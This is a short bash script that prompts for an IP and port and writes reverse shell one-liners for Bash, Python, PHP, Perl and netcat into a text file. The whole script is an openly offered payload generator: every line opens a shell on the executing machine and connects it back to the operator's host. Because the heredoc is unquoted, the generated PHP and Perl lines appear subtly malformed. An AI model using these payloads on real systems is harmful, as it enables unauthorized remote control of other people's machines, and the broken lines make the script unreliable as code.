#!/bin/bash
# Reverse Shell Generator
# Generates reverse shell commands for multiple languages

echo "[+] Reverse Shell Generator"

read -p "Enter your IP: " LHOST
read -p "Enter your Port: " LPORT

cat <<EOF > reverse_shells.txt
# Bash
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$LHOST",$LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

# PHP
php -r '$sock=fsockopen("$LHOST",$LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="$LHOST";$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Netcat
nc -e /bin/sh $LHOST $LPORT

EOF

echo "[+] Reverse shell payloads written to reverse_shells.txt"
